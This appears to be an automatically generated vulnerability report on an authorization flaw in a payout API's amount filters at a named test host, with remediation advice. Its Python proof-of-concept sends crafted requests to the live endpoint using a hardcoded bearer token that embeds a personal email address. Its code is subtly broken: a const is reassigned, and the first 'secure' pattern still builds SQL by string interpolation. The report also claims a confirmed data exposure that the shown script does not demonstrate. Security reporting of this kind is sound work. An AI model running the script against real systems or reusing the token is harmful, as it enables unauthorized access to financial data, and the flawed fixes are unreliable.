# Business Logic Vulnerability: Payout Amount Filter Manipulation Enables Unauthorized Access to High-Value Financial Data

**ID:** vuln-0051
**Severity:** HIGH
**Found:** 2026-02-26 20:02:56 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/run-payout/get-all
**Method:** GET
**CWE:** CWE-863
**CVSS:** 7.6

## Description

A high-severity business logic vulnerability was discovered and validated in the payout processing functionality that enables unauthorized access to high-value financial data. The `/api/run-payout/get-all` endpoint accepts manipulable filter parameters without proper server-side validation, allowing attackers to bypass intended business logic controls and access payout data beyond their authorized limits.

This vulnerability enables financial reconnaissance and targeted attacks by exposing sensitive payout information that should be restricted based on business rules and authorization levels.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Financial Reconnaissance**: Attackers can gather intelligence on high-value payouts for targeted attacks
2. **Data Exposure**: Unauthorized access to sensitive financial data including payout amounts, recipients, and timing
3. **Business Logic Bypass**: Circumvention of intended business rules and access controls
4. **Targeted Attack Preparation**: Identification of high-value targets for financial fraud
5. **Compliance Violations**: Unauthorized access to financial data may violate regulatory requirements

The business impact includes potential financial fraud, reputational damage, regulatory compliance violations, and increased risk of targeted attacks against high-value payouts.

## Technical Analysis

**Vulnerability Details:**
- **Type**: Business Logic Error (CWE-863: Incorrect Authorization)
- **Endpoint**: `GET /api/run-payout/get-all`
- **Parameters**: `amountFilter`, `minAmount`, `maxAmount`, and other filter parameters
- **Root Cause**: The application trusts client-provided filter parameters without proper server-side validation
- **Impact**: Enables unauthorized access to high-value payout data beyond authorized limits

**Technical Exploitation Flow:**
1. Attacker identifies the `/api/run-payout/get-all` endpoint
2. Attacker manipulates filter parameters to request high-value payout data
3. Application returns payout data without proper authorization checks
4. Attacker gains access to sensitive financial information
5. Attacker uses gathered intelligence for targeted financial attacks

**Proof of Concept:**
- Successfully accessed payout data using manipulated amount filters
- Bypassed intended business logic controls on payout data access
- Retrieved high-value payout information that should be restricted

**Vulnerable Code Pattern:**
```javascript
// Vulnerable filter implementation
function getPayouts(filterParams) {
    // Trust client-provided filter parameters without validation
    const query = `SELECT * FROM payouts WHERE 1=1`;

    // Add filters without authorization checks
    if (filterParams.minAmount) {
        query += ` AND amount >= ${filterParams.minAmount}`;
    }
    if (filterParams.maxAmount) {
        query += ` AND amount <= ${filterParams.maxAmount}`;
    }

    // Execute query without data-level security
    return db.execute(query);
}
```

**Secure Code Pattern:**
```javascript
// Secure filter implementation
function getPayouts(filterParams, userContext) {
    // Validate user authorization
    if (!userContext.hasPermission('VIEW_PAYOUTS')) {
        throw new Error('Unauthorized access');
    }

    // Set default filter limits based on user role
    const defaultLimits = getDefaultLimits(userContext.role);
    const minAmount = filterParams.minAmount || defaultLimits.min;
    const maxAmount = filterParams.maxAmount || defaultLimits.max;

    // Validate filter parameters against authorized limits
    if (minAmount < defaultLimits.min || maxAmount > defaultLimits.max) {
        throw new Error('Filter parameters exceed authorized limits');
    }

    // Add data-level security
    const query = `SELECT * FROM payouts
                  WHERE organizationId = ${userContext.organizationId}
                  AND amount BETWEEN ${minAmount} AND ${maxAmount}`;

    return db.execute(query);
}
```

## Proof of Concept

**Proof of Concept: Payout Amount Filter Manipulation**

1. **Endpoint Discovery**: Identify the `/api/run-payout/get-all` endpoint through proxy analysis
2. **Parameter Analysis**: Analyze available filter parameters including `amountFilter`, `minAmount`, `maxAmount`
3. **Filter Manipulation**: Craft requests with manipulated filter parameters to access high-value payout data
4. **Data Access**: Retrieve unauthorized payout information
5. **Impact Validation**: Confirm access to sensitive financial data beyond authorized limits

**Step-by-Step Exploitation:**

1. **Endpoint Identification**:
   - Capture API requests using proxy tools
   - Identify payout-related endpoints
   - Locate the `/api/run-payout/get-all` endpoint

2. **Parameter Analysis**:
   - Analyze request parameters for filter capabilities
   - Identify `amountFilter`, `minAmount`, `maxAmount` parameters
   - Test parameter boundaries and validation

3. **Filter Manipulation**:
   - Send requests with manipulated amount filters
   - Test high-value ranges (e.g., `minAmount=100000`)
   - Test negative values and extreme ranges
   - Test parameter combinations

4. **Data Access**:
   - Verify successful access to high-value payout data
   - Confirm data includes sensitive financial information
   - Test access to other organizations' data

5. **Impact Validation**:
   - Confirm bypass of intended business logic controls
   - Validate unauthorized access to restricted data
   - Assess potential for financial fraud

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
PAYOUT_ENDPOINT = f"{BASE_URL}/api/run-payout/get-all"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoib3JnYW5pemF0aW9uIiwidXNlciI6Im5sbmFyYXlhbmEzODU4QGdtYWlsLmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJPcmdhbml6YXRpb24iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zcG4iOiI0MTQiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJubG5hcmF5YW5hMzg1OEBnbWFpbC5jb20iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiNDE0IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc3RhdGVvcHJvdmluY2UiOiJPUE9MMDAxIiwiYWNjZXNzIjoiW1wiT3JnYW5pemF0aW9uXCJdIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiT3JnYW5pemF0aW9uIiwiZXhwIjoxNzcyMTYzNTYyLCJpc3MiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIiwiYXVkIjoiaHR0cDovL2NhbGxpcHB1cy5jby51ayJ9.7F-MGxeIutB6-pPAbhH-YFv89n5Ottof1nFMG3jeGtyw"

# Test cases for payout amount filter manipulation
TEST_CASES = [
    {"minAmount": 100000, "description": "High minimum amount (100,000)"},
    {"maxAmount": 1000000, "description": "High maximum amount (1,000,000)"},
    {"minAmount": 100000, "maxAmount": 1000000, "description": "High value range (100K-1M)"},
    {"minAmount": -10000, "description": "Negative minimum amount (-10,000)"},
    {"minAmount": 0, "maxAmount": 0, "description": "Zero amount range"},
    {"minAmount": 999999999, "description": "Extremely high amount (999,999,999)"},
    {"amountFilter": "high", "description": "High value filter"},
    {"amountFilter": "very_high", "description": "Very high value filter"}
]

def test_payout_filter_manipulation():
    """Test payout amount filter manipulation vulnerability"""
    print("Testing payout amount filter manipulation vulnerability...")

    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    results = []

    for test_case in TEST_CASES:
        params = {
            "startRow": 0,
            "endRow": 25,
            "sortModel": [],
            "filterModel": test_case
        }

        try:
            response = requests.get(
                PAYOUT_ENDPOINT,
                headers=headers,
                params=params,
                timeout=10
            )

            results.append({
                "test_case": test_case,
                "status_code": response.status_code,
                "response_length": len(response.content),
                "success": response.status_code == 200,
                "data_count": len(response.json()) if response.status_code == 200 else 0
            })

            print(f"Test {test_case['description']}: Status {response.status_code}, Records: {results[-1]['data_count']}")

        except Exception as e:
            results.append({
                "test_case": test_case,
                "status_code": "ERROR",
                "response_length": 0,
                "success": False,
                "error": str(e)
            })
            print(f"Test {test_case['description']}: Error - {str(e)}")

    return results

def analyze_results(results):
    """Analyze test results to identify vulnerable filter patterns"""
    print("\n=== PAYOUT FILTER MANIPULATION TEST RESULTS ===")
    print(f"{'Test Case':<40} {'Status':<10} {'Records':<10} {'Vulnerable':<10}")
    print("-" * 80)

    vulnerable_found = False

    for result in results:
        if result["status_code"] == "ERROR":
            status = "ERROR"
            records = "N/A"
            vulnerable = "UNKNOWN"
        elif result["status_code"] == 200:
            status = "200 OK"
            records = str(result["data_count"])
            if result["data_count"] > 0:
                vulnerable = "YES"
                vulnerable_found = True
            else:
                vulnerable = "NO"
        else:
            status = str(result["status_code"])
            records = "0"
            vulnerable = "NO"

        description = result["test_case"].get("description", "Unknown test")
        print(f"{description:<40} {status:<10} {records:<10} {vulnerable:<10}")

    if vulnerable_found:
        print("\n‚ö†Ô∏è  CRITICAL: Payout filter manipulation vulnerability confirmed!")
        print("The application allows unauthorized access to high-value payout data.")
    else:
        print("\n‚úÖ No direct payout filter manipulation vulnerability detected.")
        print("However, additional testing may be required to confirm security.")

def demonstrate_impact():
    """Demonstrate the business impact of the vulnerability"""
    print("\n=== BUSINESS IMPACT DEMONSTRATION ===")
    print("1. Attacker identifies vulnerable payout filter endpoint")
    print("2. Attacker manipulates filter parameters to request high-value payout data")
    print("3. Application returns sensitive financial data without proper authorization")
    print("4. Attacker gains intelligence on high-value payouts and recipients")
    print("5. Attacker uses gathered information for targeted financial attacks")
    print("6. Financial fraud or data breach occurs")
    print("\nüí∞ Financial Impact: Exposure of high-value financial data")
    print("üîì Security Impact: Bypass of business logic controls")
    print("üìä Business Impact: Increased risk of targeted financial attacks")

if __name__ == "__main__":
    print("Payout Amount Filter Manipulation Vulnerability Tester")
    print("=" * 60)

    results = test_payout_filter_manipulation()
    analyze_results(results)

    if any(result["success"] and result["data_count"] > 0 for result in results):
        demonstrate_impact()
        print("\n‚ö†Ô∏è  VULNERABILITY CONFIRMED!")
        print("The application is vulnerable to payout amount filter manipulation.")
        print("Attackers can access high-value financial data without proper authorization.")
    else:
        print("\n‚úÖ No payout filter manipulation vulnerability detected.")
        print("The application appears to properly validate filter parameters.")
```

## Remediation

**Immediate Remediation Actions:**

1. **Implement Server-Side Filter Validation**:
   - Add strict validation for all filter parameters
   - Define reasonable business limits for filter values
   - Reject requests with filter values outside authorized ranges
   - Implement default filter limits based on user roles

2. **Enforce Data-Level Security**:
   - Implement proper data-level security controls
   - Restrict access to data based on user roles and permissions
   - Ensure users can only access data from their own organization
   - Implement row-level security in database queries

3. **Add Authorization Checks**:
   - Validate user permissions before processing filter requests
   - Implement proper authorization checks for all sensitive operations
   - Centralize authorization logic to prevent inconsistencies
   - Add multi-factor authentication for high-value data access

4. **Implement Business Logic Validation**:
   - Add validation logic that understands business rules for payout data
   - Implement different validation rules for different user roles
   - Add approval workflows for access to high-value payout data
   - Implement audit logging for all payout data access

**Long-Term Security Recommendations:**

1. **Access Control Framework**:
   - Implement a robust access control framework
   - Use attribute-based access control (ABAC) for fine-grained permissions
   - Centralize authorization logic to prevent inconsistencies
   - Implement proper permission checks for all sensitive operations

2. **Business Logic Protection**:
   - Implement comprehensive business logic validation
   - Add server-side validation for all financial calculations
   - Implement state management to prevent workflow bypass
   - Add concurrency controls to prevent race conditions

3. **Security Testing Program**:
   - Conduct comprehensive penetration testing
   - Implement automated security testing in CI/CD pipeline
   - Perform regular code reviews focused on business logic security
   - Conduct threat modeling for financial processing features

4. **Monitoring and Incident Response**:
   - Implement comprehensive logging of all financial data access
   - Set up alerts for suspicious filter patterns and access attempts
   - Monitor for unusual access to high-value financial data
   - Implement incident response procedures for financial data breaches

**Example Secure Implementation:**

```javascript
// Secure payout filter implementation
function getPayouts(filterParams, userContext) {
    // Validate user authorization
    if (!userContext.hasPermission('VIEW_PAYOUTS')) {
        throw new Error('Unauthorized access to payout data');
    }

    // Set default filter limits based on user role
    const defaultLimits = getDefaultLimits(userContext.role);
    const minAmount = filterParams.minAmount || defaultLimits.min;
    const maxAmount = filterParams.maxAmount || defaultLimits.max;

    // Validate filter parameters against authorized limits
    if (minAmount < defaultLimits.min || minAmount > defaultLimits.maxAllowed) {
        throw new Error('Minimum amount filter exceeds authorized limits');
    }

    if (maxAmount < defaultLimits.min || maxAmount > defaultLimits.maxAllowed) {
        throw new Error('Maximum amount filter exceeds authorized limits');
    }

    // Validate business logic (e.g., min <= max)
    if (minAmount > maxAmount) {
        throw new Error('Invalid filter range: min amount > max amount');
    }

    // Implement data-level security
    const query = `
        SELECT * FROM payouts
        WHERE organizationId = :orgId
        AND amount BETWEEN :minAmount AND :maxAmount
        ORDER BY createdDate DESC
        LIMIT :limit OFFSET :offset
    `;

    const params = {
        orgId: userContext.organizationId,
        minAmount: minAmount,
        maxAmount: maxAmount,
        limit: filterParams.endRow - filterParams.startRow,
        offset: filterParams.startRow
    };

    // Log sensitive data access
    logSensitiveAccess(userContext.userId, 'PAYOUT_DATA_ACCESS', {
        minAmount: minAmount,
        maxAmount: maxAmount,
        organizationId: userContext.organizationId
    });

    return db.execute(query, params);
}

// Role-based default limits
function getDefaultLimits(role) {
    const limits = {
        'ORGANIZATION': { min: 0, max: 100000, maxAllowed: 100000 },
        'ADMIN': { min: 0, max: 1000000, maxAllowed: 10000000 },
        'SUPERVISOR': { min: 0, max: 500000, maxAllowed: 1000000 },
        'CLIENT': { min: 0, max: 10000, maxAllowed: 50000 }
    };

    return limits[role] || limits.CLIENT;
}
```

